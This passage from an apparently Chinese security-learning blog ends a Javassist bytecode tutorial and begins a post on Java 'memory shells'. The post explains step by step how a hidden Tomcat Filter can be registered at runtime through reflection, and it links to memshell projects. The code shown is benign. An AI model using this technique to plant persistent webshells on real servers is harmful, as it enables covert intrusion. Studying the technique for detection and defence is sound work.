<td>一个 java.lang.Class 对象，表示字段的类型</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>执行原始字段访问的虚拟方法的名称</td>
</tr>
</tbody></table>
<p>测试代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn_EditBody$Test&quot;</span>);</span><br><span class="line">       <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;fieldTest&quot;</span>);</span><br><span class="line">       m.instrument(<span class="keyword">new</span> <span class="title class_">ExprEditor</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">edit</span><span class="params">(FieldAccess fa)</span> <span class="keyword">throws</span> CannotCompileException &#123;</span><br><span class="line">               <span class="comment">// 如果是写操作</span></span><br><span class="line">               <span class="keyword">if</span> (fa.isWriter()) &#123;</span><br><span class="line">                   fa.replace(<span class="string">&quot;&#123;System.out.println(\&quot;写入的值是：\&quot;+$1);&#125;&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">// 如果是读操作</span></span><br><span class="line">               <span class="keyword">if</span> (fa.isReader()) &#123;</span><br><span class="line">                   fa.replace(<span class="string">&quot;&#123;System.out.println($_=\&quot;&quot;</span>+fa.getFieldName()+<span class="string">&quot;被读取\&quot;); &#125;&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">       <span class="type">Test</span> <span class="variable">instance</span> <span class="operator">=</span> (Test)cc.toClass().getDeclaredConstructor().newInstance();</span><br><span class="line">       instance.fieldTest();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">       <span class="keyword">private</span> String name;</span><br><span class="line">       <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">           System.out.println(a + b);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">           System.out.println(a);</span><br><span class="line">           <span class="keyword">return</span> a*a;</span><br><span class="line">       &#125;</span><br><span class="line">       String <span class="title function_">fieldTest</span><span class="params">()</span>&#123;</span><br><span class="line">           <span class="built_in">this</span>.name = <span class="string">&quot;Ko1sh1&quot;</span>;</span><br><span class="line">           <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="javassist-expr-NewExpr"><a href="#javassist-expr-NewExpr" class="headerlink" title="javassist.expr.NewExpr"></a>javassist.expr.NewExpr</h4><p>NewExpr 表示使用 new 运算符（不包括数组创建）创建对象的表达式。 如果发现创建对象的操作，NewEditor 中的 edit() 方法将接收到一个 NewExpr 对象。NewExpr 中的 replace() 方法接收替源代码来替换字段访问。</p>
<h4 id="javassist-expr-NewArray"><a href="#javassist-expr-NewArray" class="headerlink" title="javassist.expr.NewArray"></a>javassist.expr.NewArray</h4><p>NewArray 表示使用 new 运算符创建数组。如果发现数组创建的操作，ExprEditor 中的 edit() 方法一个 NewArray 对象。NewArray 中的 replace() 方法可以使用源代码来替换数组创建操作。</p>
<p>$ 开头的符号存在部分不同含义</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>null</td>
</tr>
<tr>
<td><code>$1</code>, <code>$1</code></td>
<td>每一维的大小</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>创建数组的返回值。一个新的数组对象存储在 $_ 中</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>所创建的数组的类型</td>
</tr>
</tbody></table>
<p>比如按下面的方式创建数组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[][] s = new String[3][4];</span><br></pre></td></tr></table></figure></div>

<p>那么$1、$2 分别是 3 和 4，$3 不可用。（如果创建的时候省略了最后一维的维度，那么最后一维也不可用）</p>
<h4 id="javassist-expr-Instanceof"><a href="#javassist-expr-Instanceof" class="headerlink" title="javassist.expr.Instanceof"></a>javassist.expr.Instanceof</h4><p>一个 InstanceOf 对象表示一个 instanceof 表达式。 如果找到 instanceof 表达式，则ExprEditor 中的 edit() 方法接收此对象。Instanceof 中的 replace() 方法可以使用源代码来替换 instanceof 表达式。</p>
<p>以$开头的标识符具有特殊含义</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>null</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>instanceof 运算符左侧的值</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>表达式的返回值。类型为 boolean</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>instanceof 运算符右侧的值</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示 instanceof 运算符右侧的类型</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>执行 instanceof 表达式的虚拟方法的名称。它需要一个参数（类型是 java.lang.Object）。如果参数类型和 instanceof 表达式右侧的类型一致，则返回 true。否则返回 false。</td>
</tr>
</tbody></table>
<p>javassist.expr.Cast</p>
<p>Cast 表示 cast 表达式。如果找到 cast 表达式，ExprEditor 中的 edit() 方法会接收到一个 Cast 对象。 Cast 的 replace() 方法可以接收源代码来替换替换 cast 表达式。</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>null</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>显示类型转换的目标类型</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>表达式的结果值。$_ 的类型和被括号括起来的类型相同</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>转换之后的类型，即被括号括起来的类型</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，和 $r 的类型相同</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>执行类型转换的虚拟方法的名称。它需要一个参数（类型是 java.lang.Object）。并在类型转换完成后返回它</td>
</tr>
</tbody></table>
<p>javassist.expr.Handler</p>
<p>Handler 对象表示 try-catch 语句的 catch 子句。 如果找到 catch，ExprEditor 中的 edit() 方法会接收此对象。 Handler 中的 insertBefore() 方法会将收到的源代码插入到 catch 子句的开头。</p>
<p>在源文本中，以$开头的标识符具有意义：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$1</code></td>
<td>catch 分支获得的异常对象</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>catch 分支获得的异常对象的类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$w</code></td>
<td>包装类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示 catch 捕获的异常的类型</td>
</tr>
</tbody></table>
<p>如果一个新的异常分配给 $1，它将作为捕获的异常传递给原始的 catch 子句。</p>
<h2 id="CtField-添加字段"><a href="#CtField-添加字段" class="headerlink" title="CtField 添加字段"></a>CtField 添加字段</h2><p>Javassist 还允许用户创建一个新字段。其中，可以通过 <code>setModifiers</code> 设置修饰类型，addField 的第二个参数表示计算初始值的表达式。这个表达式可以是任意 Java 表达式，只要其结果与字段的类型匹配。 请注意，表达式不以分号结尾。如不写第二个参数，则使用默认值。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G6_CtFieldTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G6_CtFieldTest$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">cf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(pool.get(<span class="type">int</span>.class.getName()), <span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">        cf.setModifiers(javassist.Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(cf,<span class="string">&quot;5+5&quot;</span>);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>类变为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">G6_CtFieldTest$Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">name</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> G6_CtFieldTest$Test() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>上面的方法也可以简写为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;G6_CtFieldTest$Test&quot;</span>);</span><br><span class="line"><span class="type">CtField</span> <span class="variable">f</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;public int z = 0;&quot;</span>, ctClass);</span><br><span class="line">point.addField(f);</span><br></pre></td></tr></table></figure></div>



<h2 id="删除成员"><a href="#删除成员" class="headerlink" title="删除成员"></a>删除成员</h2><p>要删除字段或方法，可以使用 CtClass 的 removeField() 或 removeMethod() 方法。 一个CtConstructor 可以通过 CtClass 的 removeConstructor() 删除。</p>
<h2 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h2><p>需要导入的所有类名都必须是完整的（必须包含包名，java.lang 除外）。例如，Javassist 编译器可以解析 Object 以及 java.lang.Object。</p>
<p>ClassPool中 调用 importPackage() 可以告诉编译器在解析类名时搜索其他包。 例如，</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.importPackage(<span class="string">&quot;java.awt&quot;</span>);</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">CtField f = CtField.<span class="built_in">make</span>(<span class="string">&quot;public Point p;&quot;</span>, cc);</span><br><span class="line">cc.addField(f);</span><br></pre></td></tr></table></figure></div>

<p>第二行导入了 java.awt 包。 因此，第三行不会抛出异常。 编译器可以将 Point 识别为java.awt.Point。</p>
<p>注意 importPackage() 不会影响 ClassPool 中的 get() 方法。只有编译器才考虑导入包。 get()  的参数必须是完整类名。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>java 内存马学习</title>
    <url>/2022/03/08/Memshell%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[
  <div class="note p-4 mb-4 rounded-small primary">
    <p>大一的时候不懂事写着玩的，如果有问题欢迎师傅们指出</p>
<p><a class="link"   href="https://github.com/Ko1sh1/StudyMem" >https://github.com/Ko1sh1/StudyMem <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  这里是当时学习的时候写的练习项目</p>

  </div>

<blockquote>
<p>参考:</p>
<ul>
<li><p><a class="link"   href="https://su18.org/post/memory-shell/" >https://su18.org/post/memory-shell/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p><a class="link"   href="https://su18.org/post/memory-shell-2/" >https://su18.org/post/memory-shell-2/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p><a class="link"   href="http://wjlshare.com/archives/1529" >Tomcat 内存马学习(一)：Filter型 – 天下大木头 (wjlshare.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
</blockquote>
<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p><strong>目前安全行业主要讨论的内存马主要分为以下几种方式：</strong></p>
<blockquote>
<ul>
<li>动态注册 servlet&#x2F;filter&#x2F;listener（使用 servlet-api 的具体实现）</li>
<li>动态注册 interceptor&#x2F;controller（使用框架如 spring&#x2F;struts2）</li>
<li>动态注册使用<strong>职责链</strong>设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</li>
<li>使用 java agent 技术写入字节码</li>
</ul>
</blockquote>
<h3 id="Servlet-API-提供的动态注册机制"><a href="#Servlet-API-提供的动态注册机制" class="headerlink" title="Servlet API 提供的动态注册机制"></a>Servlet API 提供的动态注册机制</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1.png"
                      alt="1"
                ></p>
<blockquote>
<p><code>Servlet</code>、<code>Listener</code>、<code>Filter</code> 由 <code>javax.servlet.ServletContext</code> 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。</p>
<p><code>Servlet</code> 3.0 <code>API</code> 允许使 <code>ServletContext</code> 用动态进行注册，在 Web 容器初始化的时候（即建立<code>ServletContext</code> 对象的时候）进行动态注册。可以看到 <code>ServletContext</code> 提供了 add*&#x2F;create* 方法来实现动态注册的功能。</p>
</blockquote>
<blockquote>
<ul>
<li>Servlet ：在用户请求路径与处理类映射之处，添加一个指定路径的指定处理类；</li>
<li>Filter：在用户处理类之前的，用来对请求进行额外处理提供额外功能的类；</li>
<li>Listener：在 Filter 之外的监听进程。</li>
</ul>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623383074795-16654925598902.png"
                      alt="1623383074795"
                ></p>
<h2 id="二、Filter-内存马原理分析"><a href="#二、Filter-内存马原理分析" class="headerlink" title="二、Filter 内存马原理分析"></a>二、Filter 内存马原理分析</h2><p><a class="link"   href="http://wjlshare.com/archives/1529" >Tomcat 内存马学习(一)：Filter型 – 天下大木头 (wjlshare.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（Filter流程写的相对比较清楚，讲的挺细）</p>
<p><a class="link"   href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/" >查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/" >Tomcat-Filter型内存马 - Longlone’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="知识点归纳"><a href="#知识点归纳" class="headerlink" title="知识点归纳"></a>知识点归纳</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\image-20210330212301006.png"
                      alt="image-20210330212301006"
                ></p>
<blockquote>
<p>Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。</p>
</blockquote>
<p>通常情况下，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 使用 ServletContext 的 addFilter/createFilter 方法注册；</span><br><span class="line">2. 使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册（将会在 Listener 中进行描述）；</span><br><span class="line">3. 使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态，后面会描述）。</span><br></pre></td></tr></table></figure></div>

<p>本节只讨论使用 <code>ServletContext</code> 添加 Filter 内存马的方法。首先来看一下 <code>createFilter</code> 方法，按照注释，这个类用来在调用 <code>addFilter</code> 向 <code>ServletContext</code> 实例化一个指定的 Filter 类。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623412713625.png"
                      alt="1623412713625"
                ></p>
<p>阅读上面的说明，这个类还约定了一个事情，那就是如果这个 <code>ServletContext</code> 传递给 <code>ServletContextListener</code> 的 <code>ServletContextListener.contextInitialized</code> 方法，该方法既未在 <code>web.xml</code> 或 <code>web-fragment.xml</code> 中声明，也未使用 <code>javax.servlet.annotation.WebListener</code> 进行注释，则会抛出 <code>UnsupportedOperationException</code> 异常，这个约定其实是非常重要的一点。</p>
<p>接下来看 <code>addFilter</code> 方法，<code>ServletContext</code> 中有三个重载方法，分别接收字符串类型的 <code>filterName</code> 以及 Filter 对象&#x2F;<code>className</code> 字符串&#x2F;Filter 子类的 Class 对象，提供不同场景下添加 filter 的功能，这些方法均返回 <code>FilterRegistration.Dynamic</code> 实际上就是 <code>FilterRegistration</code> 对象。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\image-20221011212148052.png"
                      alt="image-20221011212148052"
                ></p>
<p><code>addFilter</code> 方法实际上就是动态添加 filter 的最核心和关键的方法，但是这个类中同样约定了 <code>UnsupportedOperationException</code> 异常。</p>
<p>由于 <code>Servlet</code> <code>API</code> 只是提供接口定义，具体的实现还要看具体的容器，那我们首先以 Tomcat 7.0.96 为例，看一下具体的实现细节。相关实现方法在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623553440934.png"
                      alt="1623553440934"
                ></p>
<p>可以看到，这个方法创建了一个 <code>FilterDef</code> 对象，将 <code>filterName</code>、<code>filterClass</code>、filter 对象初始化进去，使用 <code>StandardContext</code> 的 <code>addFilterDef</code> 方法将创建的 <code>FilterDef</code> 储存在了 <code>StandardContext</code> 中的一个 <code>Hashmap filterDefs</code> 中，然后 new 了一个 <code>ApplicationFilterRegistration</code> 对象并且返回，并没有将这个 Filter 放到 <code>FilterChain</code> 中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。</p>
<p>这时我们肯定要想，能不能直接操纵 <code>FilterChain</code> 呢？<code>FilterChain</code> 在 Tomcat 中的实现是 <code>org.apache.catalina.core.ApplicationFilterChain</code>，这个类提供了一个 <code>addFilter</code> 方法添加 Filter，这个方法接受一个 <code>ApplicationFilterConfig</code> 对象，将其放在 <code>this.filters</code> 中。答案是可以，但是没用，因为对于每次请求需要执行的 <code>FilterChain</code> 都是动态取得的。</p>
<blockquote>
<p>那Tomcat 是如何处理一次请求对应的 <code>FilterChain</code> 的呢？在 <code>ApplicationFilterFactory</code> 的 <code>createFilterChain</code> 方法中，可以看到流程如下：</p>
<ul>
<li>在 context 中获取 <code>filterMaps</code>，并遍历匹配 url 地址和请求是否匹配；</li>
<li>如果匹配则在 context 中根据 <code>filterMaps</code> 中的 <code>filterName</code> 查找对应的 <code>filterConfig</code>；</li>
<li>如果获取到 filterConfig，则将其加入到 filterChain 中</li>
<li>后续将会循环 filterChain 中的全部 filterConfig，通过 <code>getFilter</code> 方法获取 Filter 并执行 Filter 的 <code>doFilter</code> 方法。</li>
</ul>
<p>通过上述流程可以知道，每次请求的 <code>FilterChain</code> 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 <code>StandardContext</code> 中 <code>filterMaps</code> 中添加 <code>FilterMap</code>，在 <code>filterConfigs</code> 中添加 <code>ApplicationFilterConfig</code>。这样程序创建时就可以找到添加的 Filter 了。</p>
</blockquote>
<p>在之前的 <code>ApplicationContext</code> 的 <code>addFilter</code> 中将 filter 初始化存储在了 <code>StandardContext</code> 的 <code>filterDefs</code> 中，那后面又是如何添加在其他参数中的呢？</p>
<p>在 <code>StandardContext</code> 的 <code>filterStart</code> 方法中生成了 <code>filterConfigs</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623566822352.png"
                      alt="1623566822352"
                ></p>
<p>在 <code>ApplicationFilterRegistration</code> 的 <code>addMappingForUrlPatterns</code> 中生成了 <code>filterMaps</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623566974104.png"
                      alt="1623566974104"
                ></p>
<p>而这两者的信息都是从 <code>filterDefs</code> 中的对象获取的。</p>
<p><strong>在应用程序中动态的添加一个 filter 的思路：</strong></p>
<blockquote>
<ul>
<li><p>调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要<strong>反射修改应用程序的运行状态</strong>，加完之后再改回来；</p>
</li>
<li><p>调用 StandardContext 的 filterStart 方法生成 filterConfigs；</p>
</li>
<li><p>调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；</p>
</li>
<li><p>为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，<strong>也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位</strong>。</p>
</li>
</ul>
</blockquote>
<p><strong>总结一下</strong></p>
<p>过程中遇到的类</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</span><br><span class="line"></span><br><span class="line">FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</span><br><span class="line"></span><br><span class="line">FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</span><br><span class="line"></span><br><span class="line">FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</span><br><span class="line"></span><br><span class="line">WebXml：存放 web.xml 中内容的类</span><br><span class="line"></span><br><span class="line">ContextConfig：Web应用的上下文配置类</span><br><span class="line"></span><br><span class="line">StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</span><br><span class="line"></span><br><span class="line">StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</span><br></pre></td></tr></table></figure></div>

<p>流程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\image-20210331212905616.png"
                      alt="image-20210331212905616"
                ></p>
<h3 id="大概写个内存马"><a href="#大概写个内存马" class="headerlink" title="大概写个内存马"></a>大概写个内存马</h3><h4 id="先简单理理思路"><a href="#先简单理理思路" class="headerlink" title="先简单理理思路"></a>先简单理理思路</h4><p><strong>在了解了上述逻辑后，在应用程序中动态的添加一个 filter 的思路就清晰了：</strong></p>
<blockquote>
<ul>
<li>调用 <code>ApplicationContext</code> 的 <code>addFilter</code> 方法创建 <code>filterDefs</code> 对象，需要反射修改应用程序的运行状态，加完之后再改回来；</li>
<li>调用 <code>StandardContext</code> 的 <code>filterStart</code> 方法生成 <code>filterConfigs</code>；</li>
<li>调用 <code>ApplicationFilterRegistration</code> 的 <code>addMappingForUrlPatterns</code> 生成 <code>filterMaps</code>；</li>
<li>为了兼容某些特殊情况，将我们加入的 <code>filter</code> 放在 <code>filterMaps</code> 的第一位，可以自己修改 <code>HashMap</code> 中的顺序，也可以在自己调用 <code>StandardContext</code> 的 <code>addFilterMapBefore</code> 直接加在 <code>filterMaps</code> 的第一位。</li>
</ul>
<p>换一种解释</p>
<ol>
<li>根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</li>
<li>根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</li>
<li>找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain</li>
<li>filterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</li>
</ol>
</blockquote>
<p><strong>可以去看其他师傅写的好的，自己修改修改</strong></p>
<blockquote>
<p>su18师傅写的，做的是访问后使index页面的id+3</p>
<p><a class="link"   href="https://github.com/su18/MemoryShell/commit/38ffaf43782176c47044f588164923c3c5a36b8b#diff-0d6379fd4a157c3267bcf44412fe7df7129c825ccf76abc63786a926c6ae8b98" >项目地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>胡师傅写的</p>
<p><a class="link"   href="https://github.com/AmTrain-Ricky/JavaMemShellLearn/blob/main/TomcatMemShell/src/main/java/com/tomcat/memshell/Filter/MemFilter.java" >JavaMemShellLearn&#x2F;MemFilter.java at main · AmTrain-Ricky&#x2F;JavaMemShellLearn (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><strong>自己写的</strong></p>
<p>先科普一下Filter建法</p>
<p><strong>自定义 filter（基本上需要的内容）</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>不做过多解释，都能看懂</p>
<p>然后在<code>web.xml</code>中注册我们的filter，这里我们设置url-pattern为 我们的项目地址才行，这里因为用了servlet来加载（我这么理解），所以可以写servlet标签就行,要写filter标签也行，这里大概给个范例</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.tomcat.memshell.Filter.KoishiMemFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    